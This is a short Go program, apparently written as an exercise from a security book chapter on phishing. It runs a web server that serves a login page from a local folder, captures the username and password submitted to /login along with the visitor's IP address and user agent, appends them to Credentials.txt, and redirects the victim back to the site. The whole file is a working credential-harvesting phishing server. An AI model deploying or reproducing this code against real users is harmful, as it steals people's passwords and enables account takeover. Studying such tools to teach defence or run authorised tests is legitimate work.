package main

import (
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"),
		"password":   r.FormValue("_pass"),
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempted")
	http.Redirect(w, r, "/", 302)
}

func main() {
	fh, err := os.OpenFile("Credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}

	defer fh.Close()

	log.SetOutput(fh)
	r := mux.NewRouter()
	r.HandleFunc("/login", login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\BHGO\\ch4\\phishing_example\\public")))
	log.Fatal(http.ListenAndServe(":8080", r))

}
